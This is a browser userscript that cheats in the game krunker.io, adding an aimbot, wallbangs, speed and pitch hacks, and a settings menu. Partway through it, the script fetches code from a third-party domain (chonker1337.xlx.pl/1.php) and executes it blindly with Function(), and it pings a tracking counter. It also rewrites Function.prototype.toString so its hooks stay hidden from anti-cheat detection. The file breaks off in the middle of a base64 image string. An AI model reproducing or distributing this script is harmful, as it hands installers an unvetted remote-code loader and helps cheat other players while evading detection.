// ==UserScript==
// @name         gpu aimh@cks script dll apk js on cheats public patch v2
// @namespace    skidlamer.github.io
// @author       chonker1337
// @match        *://krunker.io/*
// @run-at       document-start
// @grant        none
// ==/UserScript==

(function() {
    function req(url) {
        let xreq = new XMLHttpRequest()
        xreq.open("GET", url, false)
        xreq.setRequestHeader("Cache-Control", "no-cache")
        xreq.send(null)
        return xreq.responseText.slice(xreq.responseText.indexOf("/*start*/"), xreq.responseText.indexOf("//end"))
    }

    let wsdata;
    if (localStorage.wsdata) {
        wsdata = JSON.parse(localStorage.wsdata);
        delete localStorage.wsdata;
    } else {
        window.fetch("https://api.countapi.xyz/hit/chonker1337.xlx.pl/cheat2").then()

        const decodeURIComponent = window.decodeURIComponent;
        const exec = RegExp.prototype.exec;
        const toClean = new WeakMap()
        let _tostr = Function.prototype.toString;
        Function.prototype.toString = function toString() {
            if (toClean.has(this)) {
                return _tostr.apply(toClean.get(this), arguments)
            }
            return _tostr.apply(this, arguments)
        }
        toClean.set(Function.prototype.toString, _tostr)
        let _json = Response.prototype.json
        let hookedJson = Response.prototype.json = function json() {
            return _json.apply(this, arguments).then(obj => {
                if (obj.clientId && obj.host) {
                    console.log(obj)
                    localStorage.wsdata = JSON.stringify(obj)
                    document.write("LOADING CHEAT")
                    window.location.reload()
                    throw new Error()
                }
                return obj;
            })
        }
        toClean.set(hookedJson, _json)



        const hookedIframes = new WeakSet()
        let _contentWindowGet = Object.getOwnPropertyDescriptor(HTMLIFrameElement.prototype, "contentWindow").get;
        let newGet = function contentWindow() {
            if(arguments.callee.caller && arguments.callee.caller.toString().includes("recaptcha")) return _contentWindowGet.apply(this)

            let contentWindow = _contentWindowGet.apply(this)
            if (hookedIframes.has(contentWindow)) {
                return contentWindow
            }
            if (!contentWindow) {
                return contentWindow
            }
            let _json = contentWindow.Response.prototype.json;
            contentWindow.Response.prototype.json = function json() {
                return hookedJson.apply(this, arguments)
            }
            toClean.set(contentWindow.Response.prototype.json, _json);
            let _tostr2 = contentWindow.Function.prototype.toString;
            contentWindow.Function.prototype.toString = function toString() {
                if (toClean.has(this)) {
                    return _tostr2.apply(toClean.get(this), arguments)
                }
                return _tostr2.apply(this, arguments)
            }
            toClean.set(contentWindow.Function.prototype.toString, _tostr2)

            let _newGet = function contentWindow() {
                return newGet.apply(this, arguments)
            }
            Object.defineProperty(contentWindow.HTMLIFrameElement.prototype, "contentWindow", {
                get: _newGet,
                configurable: true,
            })
            toClean.set(_newGet, _contentWindowGet)

            hookedIframes.add(contentWindow)
            return contentWindow
        }
        Object.defineProperty(HTMLIFrameElement.prototype, "contentWindow", {
            get: newGet,
            configurable: true,
        })
        toClean.set(newGet, _contentWindowGet)

        return
    }

    {let _now=Date.now;Date.now=()=>_now()*(cheat.settings.speedHack?1.2:1)}

    let xreq = new XMLHttpRequest()
    Function(req("https://chonker1337.xlx.pl/1.php"))()

    window.cheat = {
        settings: {
            aimbot: 1,
            staticWeaponZoom: true,
            wallbangs: true,
            alwaysAim: false,
            pitchHack: 1,
            thirdPerson: false,
            autoReload: true,
            speedHack: true,
            rangeCheck: true,
        },
        state: {
            quickscopeCanShoot: true,
        },
        gui: {},
        math: {
            getDir: function(x1, y1, x2, y2) {
                return Math.atan2(y1 - y2, x1 - x2);
            },
            getDistance: function(x1, y1, x2, y2) {
                return Math.sqrt((x2 -= x1) * x2 + (y2 -= y1) * y2);
            },
            getD3D: function(x1, y1, z1, x2, y2, z2) {
                const dx = x1 - x2, dy = y1 - y2, dz = z1 - z2;
                return Math.sqrt(dx * dx + dy * dy + dz * dz);
            },
            getAngleDst: function(a, b) {
                return Math.atan2(Math.sin(b - a), Math.cos(a - b));
            },
            getXDire: function(x1, y1, z1, x2, y2, z2) {
                const h = Math.abs(y1 - y2), dst = this.getD3D(x1, y1, z1, x2, y2, z2);
                return (Math.asin(h / dst) * ((y1 > y2) ? -1 : 1));
            },
            lineInRect: function(lx1, lz1, ly1, dx, dz, dy, x1, z1, y1, x2, z2, y2) {
                const t1 = (x1 - lx1) * dx, t2 = (x2 - lx1) * dx, t3 = (y1 - ly1) * dy;
                const t4 = (y2 - ly1) * dy, t5 = (z1 - lz1) * dz, t6 = (z2 - lz1) * dz;
                const tmin = Math.max(Math.max(Math.min(t1, t2), Math.min(t3, t4)), Math.min(t5, t6));
                const tmax = Math.min(Math.min(Math.max(t1, t2), Math.max(t3, t4)), Math.max(t5, t6));
                return (tmax < 0 || tmin > tmax) ? false : tmin;
            },
            getCanSee: function(game, from, toX, toY, toZ, boxSize) {
                if (!game || !from) return 0;
                boxSize = boxSize || 0;
                const cameraHeight = 1.5;
                for (let obj, dist = this.getD3D(from.x, from.y, from.z, toX, toY, toZ), xDr = this.getDir(from.z, from.x, toZ, toX), yDr = this.getDir(this.getDistance(from.x, from.z, toX, toZ), toY, 0, from.y), dx = 1 / (dist * Math.sin(xDr - Math.PI) * Math.cos(yDr)), dz = 1 / (dist * Math.cos(xDr - Math.PI) * Math.cos(yDr)), dy = 1 / (dist * Math.sin(yDr)), yOffset = from.y + (from.height || 0) - cameraHeight, i = 0; i < game.map.manager.objects.length; ++i)
                    if (!(obj = game.map.manager.objects[i]).noShoot && /*obj.active &&*/ !obj.transparent) {
                        const tmpDst = this.lineInRect(from.x, from.z, yOffset, dx, dz, dy, obj.x - Math.max(0, obj.width - boxSize), obj.z - Math.max(0, obj.length - boxSize), obj.y - Math.max(0, obj.height - boxSize), obj.x + Math.max(0, obj.width - boxSize), obj.z + Math.max(0, obj.length - boxSize), obj.y + Math.max(0, obj.height - boxSize));
                        if (tmpDst && 1 > tmpDst) return tmpDst;
                    }
                const terrain = game.map.terrain;
                if (terrain) {
                    const terrainRaycast = terrain.raycast(from.x, -from.z, yOffset, 1 / dx, -1 / dz, 1 / dy);
                    if (terrainRaycast) return this.getD3D(from.x, from.y, from.z, terrainRaycast.x, terrainRaycast.z, -terrainRaycast.y);
                }
                return null;
            }
        },
    }
    if (localStorage.gpuaimhaxsettngs) {
        Object.assign(cheat.settings, JSON.parse(localStorage.gpuaimhaxsettngs))
    } else {
        localStorage.gpuaimhaxsettngs = JSON.stringify(cheat.settings)
    }
    Object.defineProperty(Object.prototype, "thirdPerson", {
        get() {return cheat.settings.thirdPerson}
    })

    function getGuiHtml() {
        function createCheckbox(name, settingName, description = "", needsRestart = false) {
            return `<div class="settName" title="${description}">${name} ${needsRestart ? "<span style=\"color: #eb5656\">*</span>" : ""}<label class="switch" style="margin-left:10px"><input type="checkbox" onclick='cheat.gui.setSetting("${settingName}", this.checked)' ${cheat.settings[settingName]?"checked":""}><span class="slider"></span></label></div>`
        }

        function createSelect(name, settingName, options, description = "", needsRestart = false) {
            let built = `<div class="settName" title="${description}">${name} ${needsRestart ? "<span style=\"color: #eb5656\">*</span>" : ""}<select onchange='cheat.gui.setSetting("${settingName}", parseInt(this.value))' class="inputGrey2">`
            let i = 0;
            for (const option in options) {
                if (options.hasOwnProperty(option))
                    built += `<option value="${options[option]}" ${cheat.settings[settingName] == options[option]?"selected":""}>${option}</option>,`
            }
            return built + "</select></div>"
        }

        let built = `<div id="settHolder">
                <h3>OP AIMh@x js userscrtips no downalod</h3>
                <h5>Made by chonker1337, skidded and stolen by izioid.<br>
                Join <a href="https://discord.gg/9Xq6m3J">Gaming Gurus</a> for more hacks.<br></h5>
                <p style="font-size: 14px;margin: 10px">This hack isn't mean to make you slightly better in game. It's meant to make you fucking insane, so expect to get banned if you play with high level players. Also, don't ask me to add options like frustum check or aim assist</p><br>`

        built += createSelect("Aimbot", "aimbot", {
            "None": 0,
            "Quickscope": 1,
            "Silent aim": 2,
        })
        built += createSelect("Pitch hax", "pitchHack", {
            "Disabled": 0,
            "Downward": 1,
            "Upward": 2,
        }, "Only use with aimbot on")
        built += createCheckbox("Wallbangs", "wallbangs")
        built += createCheckbox("Always aim", "alwaysAim", "Makes you slower and jump lower, but the aimbot can start shooting at enemies much faster. Only use if ur good at bhopping")
        built += createCheckbox("Auto reload", "autoReload")
        built += createCheckbox("Speed hack", "speedHack", "Makes you 1.2x faster")
        built += createCheckbox("Third person mode", "thirdPerson")
        built += createCheckbox("No weapon zoom", "staticWeaponZoom", "Removes the distracting weapon zoom animation")
        built += createCheckbox("Aimbot range check", "rangeCheck")
        return built+"</div>"
    }
    function initGUI() {
        function createButton(name, icon, fn) {
            const menu = document.querySelector("#menuItemContainer"),
                menuItem = document.createElement("div"),
                menuItemIcon = document.createElement("div"),
                menuItemTitle = document.createElement("div");

            menuItem.className = "menuItem"
            menuItemIcon.className = "menuItemIcon"
            menuItemTitle.className = "menuItemTitle"

            menuItemTitle.innerHTML = name
            menuItemIcon.style.backgroundImage = "url("+icon+")"

            menuItem.append(menuItemIcon, menuItemTitle)
            menu.append(menuItem)

            menuItem.addEventListener("click", fn)
        }
        cheat.gui.setSetting = function(setting, value) {
            cheat.settings[setting] = value;
            localStorage.gpuaimhaxsettngs = JSON.stringify(cheat.settings)
        }
        cheat.gui.windowIndex = window.windows.length+1;
        cheat.gui.settings = {
            aimbot: {
                val: cheat.settings.aimbot
            }
        }
        cheat.gui.windowObj = {
            header: "CH33T",
            html: "",
            gen() {
                return getGuiHtml();
            }
        };
        Object.defineProperty(window.windows, windows.length, {
            value: cheat.gui.windowObj
        })
        const icon = "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAgAAAAIACAYAAAD0eNT6AAAACXBIWXMAAC4jAAAuIwF4pT92AAAgAElEQVR42uydB3xUVfbHh6KA2Fdlde1rWStFUGwgIjXJezOTirquZa1r3b+7ruuuunYFycykECBAQiD0DqF3pAhIMiW9994mPZm5/3PevEBE0Pcyb5KZyTl+vp/BEJKZd88953fbuSoVGRkZGRkZGRkZGRkZGR"+
            "kZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZWa9YxXxfFVs3VWXR8Reb9NxNZj1/v0nPjwXGAVNNBm66Wc89CX9+DF7HmAz8XcAws0476OiHf1MlzQyhh0hGRkZGRuYJdjx6uioxwq+/KYwfBsl8OiT3j4AlwA9ANl"+
            "ADtAJ2ERvQBJQDFmAbEO34d5yP0cBfB/RPCteoksLU9IDJyMi81lJ1garqz/+rStarVTAo6g9xcADEwQEweBpo1vEDxf/vb9Kp+x2fHazK/n6SaoX+Q3pwZL1n4JgqyyytymzgLwfnxNG9ARz2lJjUMcGzboD/rgIwigLieRACfzTqNINLQsepjulpdoCMjMyzLW02p8qeyWOyvwhi3B8gbt4HcMC/gCj42nJgM7Ab2AWsA2KBWcDfgCfh+26FuH"+
            "tpol7bD6CHStaTyZ9DLgFH1ABrxBE+cwHtQDoQCfibDdyw5ndDVD/O96VGICMj8xizRExXzb9licpk8L1SXA59HZgHnABqgTYJAyecPe0AmkEAZIpC4T3gEWMYf5ExnKcHTebCxK/nkIEmHf8wON1SoNJFif9c1IDT74HX10w6NS4RDACoUcjIyNzWfvriWZUpVD0E4tY9MGJ/H153AvliIlciLqJoyAWWmQycf5KBvyxTP02VavChh0+mjCWH8q"+
            "pTEThlxV8NjvYPIK8HE//ZtAAngf+DDvXHkxvHqBJjJlIjkZGRucdAKdxPpVUdgtE+d7U4SxoHFImjfFfGRivE6E3CcoJBg5uwqTHInDOTzk+VqtPglP+fzKgy9XxzLyb/s5XvYehkr5jCNFcYIyaoMj97lxqMjIysVywlaprq7QHzcV8UJv7nxHX82l6IjTgzG2XUc3d9O+km1anvacmUrDtKVsercr7wV4GSxGN8+8Q1KOZmNABbAR9TqPoic/"+
            "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"+
